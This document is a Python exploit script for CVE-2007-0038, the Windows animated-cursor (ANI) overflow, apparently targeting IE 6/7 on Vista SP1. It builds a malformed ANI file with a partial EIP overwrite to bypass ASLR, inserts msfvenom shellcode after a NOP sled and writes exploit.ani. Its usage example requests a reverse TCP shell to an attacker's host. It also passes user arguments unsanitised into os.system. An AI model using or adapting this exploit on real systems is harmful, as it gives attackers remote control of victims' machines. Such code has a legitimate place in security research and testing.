#!/usr/bin/python3

# CVE: CVE-2007-0038 (https://nvd.nist.gov/vuln/detail/CVE-2007-0038)
# Method: partial EIP override for ASLR bypass
# Author: werebug (https://werebug.com)
# Tested on: Windows Vista SP 1
# Software: IE 6/7

import sys
import os

if len(sys.argv) < 2:
    print("Usage: /ms-07-017-payloads.py MSFVENOM-ARGS")
    print("Example: ./ms07-017-payloads.py -p windows/shell_reverse_tcp LHOST=192.168.100.55 LPORT=4545")
    print("Note: the script will automatically choose format.")
    exit(1)

venom_args = ' '.join(sys.argv[1:])

# RIFF header, ACON header, first anih chunk
loader  = b"\x52\x49\x46\x46" + b"\xEB\x16\x00\x00" + b"\x41\x43\x4f\x4e" + b"\x61\x6e\x69\x68"
loader += b"\x24\x00\x00\x00" + b"\x24\x00\x00\x00" + b"\x02\x00\x00\x00" + b"\xEB\x7B\x00\x00"
loader += b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00"
loader += b"\x00\x00\x00\x00" + b"\x01\x00\x00\x00" + b"\x61\x6E\x69\x68"

anih2_pad = b"\x00\x00\x00"

fill = b"\x41\x41\x41\x41" + b"\x41\x41\x41\x41" + b"\x41\x41\x41\x41" + b"\x41\x41\x41\x41"
fill += b"\x41\x41\x41\x41" + b"\x41\x41\x41\x41" + b"\x41\x41\x41\x41" + b"\x41\x41\x41\x41"
fill += b"\x00\x41\x41\x41" + b"\x41\x41\x41\x41" + b"\x41\x41\x41\x41" + b"\x41\x41\x41\x41"
fill += b"\x41\x41\x41\x41" + b"\x41\x41\x41\x41" + b"\x41\x41\x41\x41" + b"\x00\x00\x00\x00"
fill += b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00"
fill += b"\x42\x42\x42\x42"

# JMP DWORD PTR DS:[EBX] at 7594700B
eip = b"\x0B\x70"

nops = b"\x90"*20;

# generating shell code
tmpf = 'ani_payload'
os.system('msfvenom ' + venom_args + ' -f raw > ' + tmpf)
f = open(tmpf, 'r+b')
shellcode = f.read()
f.close()
os.unlink(tmpf)

# Length of my chunk
anih2_length = bytes([int(hex(len(fill + eip)), base=16)])

payload = loader + anih2_length + anih2_pad + fill + eip + nops + shellcode

f = open('exploit.ani','w+b')
f.write(payload)
f.close()
